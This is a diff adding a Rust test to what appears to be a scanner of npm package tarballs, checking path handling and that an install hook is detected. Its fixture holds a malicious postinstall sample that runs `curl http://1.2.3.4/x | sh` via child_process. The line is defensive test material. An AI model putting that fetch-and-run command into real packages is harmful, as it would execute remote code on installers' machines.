@@ -405,6 +405,39 @@ fn duplicate_root_manifest_is_unread() {
 }
 
 #[test]
+fn npm_file_inside_a_directory_of_the_same_name_is_read() {
+    // next 16.4.0 ships `dist/compiled/ipaddr.js/ipaddr.js`. The scanner names that entry
+    // `dist/compiled/ipaddr.js` (it collapses doubled trailing names), npm writes it to the
+    // full path; both hold the same bytes, so nothing went unread.
+    let bytes = tar_gz(&[
+        TarItem::File("package/package.json", PJ_BENIGN),
+        TarItem::File(
+            "package/dist/compiled/ipaddr.js/ipaddr.js",
+            b"module.exports=1\n",
+        ),
+    ]);
+    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
+    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
+
+    // An install hook that runs such a file by its full path puts it on the surface.
+    let pj = br#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"node lib/x.js/x.js"}}"#;
+    let bytes = tar_gz(&[
+        TarItem::File("package/package.json", pj),
+        TarItem::File(
+            "package/lib/x.js/x.js",
+            b"require('child_process').exec('curl http://1.2.3.4/x | sh')\n",
+        ),
+    ]);
+    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
+    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
+    assert!(
+        r.features["inst_proc_exec"] > 0.0,
+        "{:?}",
+        r.install_surface
+    );
+}
+
+#[test]
 fn identical_duplicates_are_not_flagged() {
     let bytes = tar_gz(&[
         TarItem::File("package/package.json", PJ_BENIGN),
